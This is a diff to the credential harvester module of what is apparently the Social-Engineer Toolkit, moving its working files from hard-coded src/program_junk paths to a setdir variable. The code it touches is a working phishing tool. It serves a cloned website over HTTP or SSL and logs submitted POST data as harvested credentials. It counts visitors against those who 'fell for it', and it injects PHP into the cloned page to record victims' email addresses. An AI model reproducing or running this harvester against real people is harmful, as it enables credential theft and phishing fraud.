@@ -50,7 +50,7 @@ sys.path.append(definepath)
 from src.core.setcore import *
 
 attack_vector=""
-fileopen=file("src/program_junk/attack_vector", "r")
+fileopen=file(setdir + "/attack_vector", "r")
 for line in fileopen:
     line=line.rstrip()
     if line == 'multiattack':
@@ -86,14 +86,14 @@ for line in fileopen:
     match2=re.search("COMMAND_CENTER=ON", line)
     if match2:
         command_center="on"
-        command_center_write=file("%s/src/program_junk/cc_harvester_hit" % (definepath),"w")
+        command_center_write=file(setdir + "/cc_harvester_hit" % (setdir),"w")
 
 # if nada default port 80
 if counter == 0: web_port=80
 
 # pull URL field
 counter=0
-fileopen=file("src/program_junk/site.template","r").readlines()
+fileopen=file(setdir + "/site.template","r").readlines()
 for line in fileopen:
     line=line.rstrip()
     match=re.search("URL=",line)
@@ -138,9 +138,9 @@ for line in fileopen:
                 sys.path.append("src/core/ssl")
                 # import our ssl module
                 import setssl
-                subprocess.Popen("cp src/program_junk/CA/*.pem src/program_junk", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                subprocess.Popen("cp %s/CA/*.pem %s" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                 # remove old junk we dont need anymore
-                subprocess.Popen("rm -rf src/program_junk/CA;cp *.pem src/program_junk", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                subprocess.Popen("rm -rf %s/CA;cp *.pem %s" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
         # if user wants to specify his/her own PEM certificate
         if self_signed== "false":
@@ -154,7 +154,7 @@ for line in fileopen:
                         print "\nUnable to find PEM file, check location and config again."
                         exit_set()
                     if os.path.isfile(pem_client):
-                        subprocess.Popen("cp %s src/program_junk/newcert.pem" % (pem_client), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen("cp %s %s/newcert.pem" % (pem_client,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                 match2=re.search("PEM_SERVER=", line)
                 if match2:
                     pem_server=line.replace("PEM_SERVER=","")
@@ -162,7 +162,7 @@ for line in fileopen:
                         print "\nUnable to find PEM file, check location and config again."
                         exit_set()
                     if os.path.isfile(pem_server):
-                        subprocess.Popen("cp %s src/program_junk/newreq.pem" % (pem_server), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen("cp %s %s/newreq.pem" % (pem_server,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 # url decode for postbacks
 def htc(m):
@@ -175,8 +175,8 @@ def urldecode(url):
 
 
 # here is where we specify how many people actually visited versus fell for it
-visits = file("src/program_junk/visits.file", "a")
-bites = file("src/program_junk/bites.file", "a")
+visits = file(setdir + "/visits.file", "a")
+bites = file(setdir + "/bites.file", "a")
 
 # SET Handler for handling POST requests and general setup through SSL
 #class SETHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
@@ -218,7 +218,7 @@ class SETHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header('Content_type', 'text/html')
                 self.end_headers()
-                fileopen=file("%s/src/program_junk/web_clone/index.html" % (definepath), "r")
+                fileopen=file(setdir + "/web_clone/index.html", "r")
                 for line in fileopen:
                     self.wfile.write(line)
                 # write out that we had a visit
@@ -231,7 +231,7 @@ class SETHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header('Content_type', 'text/html')
                 self.end_headers()
-                fileopen=file("%s/src/program_junk/web_clone/index2.html" % (definepath), "r")
+                fileopen=file(setdir + "/web_clone/index2.html", "r")
                 for line in fileopen:
                     self.wfile.write(line)
                 # write out that we had a visit
@@ -240,19 +240,18 @@ class SETHandler(BaseHTTPRequestHandler):
                 counter = 1
 
             else:
-                if os.path.isfile("%s/src/program_junk/web_clone/%s" % (definepath,self.path)):
+                if os.path.isfile(setdir + "/web_clone/%s" % (self.path)):
                     self.send_response(200)
-#                                       self.send_header('Content-type', 'text/html')
                     self.end_headers()
-                    fileopen=file("%s/src/program_junk/web_clone/%s" % (definepath,self.path), "rb")
+                    fileopen=file(setdir + "/web_clone/%s" % (self.path), "rb")
                     for line in fileopen:
                         self.wfile.write(line)
 
 
             # if the file wasn't found
             if counter == 0:
-                if os.path.isfile("%s/src/program_junk/web_clone/%s" % (definepath,self.path)):
-                    fileopen=file("%s/src/program_junk/web_clone%s" % (definepath,self.path), "rb")
+                if os.path.isfile(setdir + "/web_clone/%s" % (self.path)):
+                    fileopen=file(setdir + "/web_clone/%s" % (self.path), "rb")
                     for line in fileopen:
                         self.wfile.write(line)
                     fileopen.close()
@@ -275,7 +274,7 @@ class SETHandler(BaseHTTPRequestHandler):
         # change path to root for append on file
         os.chdir(homepath)
         # put the params into site.template for later user
-        filewrite=file("src/program_junk/site.template","a")
+        filewrite=file(setdir + "/site.template","a")
         filewrite.write("\n")
         filewrite2 = file("src/logs/harvester.log", "a")
         filewrite.write("\n\n")
@@ -309,7 +308,7 @@ class SETHandler(BaseHTTPRequestHandler):
 
         # pull URL field
         counter=0
-        fileopen=file("src/program_junk/site.template","r").readlines()
+        fileopen=file(setdir + "/site.template","r").readlines()
         for line in fileopen:
             line=line.rstrip()
             match=re.search("URL=",line)
@@ -330,7 +329,7 @@ class SETHandler(BaseHTTPRequestHandler):
         self.wfile.write('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL))
 
         # set it back to our homepage
-        os.chdir(homepath+"/src/program_junk/web_clone/")
+        os.chdir(setdir + "/web_clone/")
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
@@ -438,21 +437,21 @@ def run():
         subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (apache_dir,now), shell=True).wait()
         # here we specify if we are tracking users and such
         if track_email.lower() == "on":
-            fileopen = file ("%s/src/program_junk/web_clone/index.html" % (definepath), "r")
+            fileopen = file (setdir + "/web_clone/index.html", "r")
             data = fileopen.read()
             data = data.replace("<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (now))
-            filewrite = file("%s/src/program_junk/web_clone/index.2" % (definepath), "w")
+            filewrite = file(setdir + "/web_clone/index.2", "w")
             filewrite.write(data)
             filewrite.close()
-            os.remove("%s/src/program_junk/web_clone/index.html" % (definepath))
-            shutil.copyfile("%s/src/program_junk/web_clone/index.2" % (definepath), "%s/src/program_junk/web_clone/index.html" % (definepath))
+            os.remove(setdir + "/web_clone/index.html")
+            shutil.copyfile(setdir + "/web_clone/index.2", setdir + "/web_clone/index.html")
 
         if os.path.isfile("%s/index.html" % (apache_dir)):
             os.remove("%s/index.html" % (apache_dir))
         if track_email.lower() == "off":
-            shutil.copyfile("%s/src/program_junk/web_clone/index.html" % (definepath), "%s/index.html" % (apache_dir))
+            shutil.copyfile(setdir + "/web_clone/index.html", "%s/index.html" % (apache_dir))
         if track_email.lower() == "on":
-            shutil.copyfile("%s/src/program_junk/web_clone/index.html" % (definepath), "%s/index.php" % (apache_dir))
+            shutil.copyfile(setdir + "/web_clone/index.html", "%s/index.php" % (apache_dir))
             print_status("NOTE: The URL to click on is index.php NOT index.html with track emails.")
         print_status("All files have been copied to %s" % (apache_dir))
 
@@ -494,7 +493,7 @@ if webattack_email == "on":
         reload(src.phishing.smtp.client.smtp_web)
 
 # see if we're tabnabbing or multiattack
-fileopen=file("src/program_junk/attack_vector", "r")
+fileopen=file(setdir + "/attack_vector", "r")
 for line in fileopen:
     line=line.rstrip()
     if line == 'tabnabbing':
@@ -505,16 +504,16 @@ for line in fileopen:
 if ssl_flag == 'true':
     web_port="443"
     # check for PEM files here
-    if not os.path.isfile("src/program_junk/newreq.pem"):
+    if not os.path.isfile(setdir + "/newreq.pem"):
         print "PEM files not detected. SSL will not work properly."
-    if not os.path.isfile("src/program_junk/newcert.pem"):
+    if not os.path.isfile(setdir + "/newcert.pem"):
         print "PEM files not detected. SSL will not work properly."
     # copy over our PEM files
     #if self_signed =="true":
-    subprocess.Popen("cp src/program_junk/*.pem src/program_junk/web_clone/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    subprocess.Popen("cp %s/*.pem %s/web_clone/" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 # head over to cloned dir
-os.chdir("src/program_junk/web_clone/")
+os.chdir(setdir + "/web_clone/")
 
 if attack_vector != "multiattack":
     print bcolors.BLUE+"[*] Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port "+web_port+"\r"
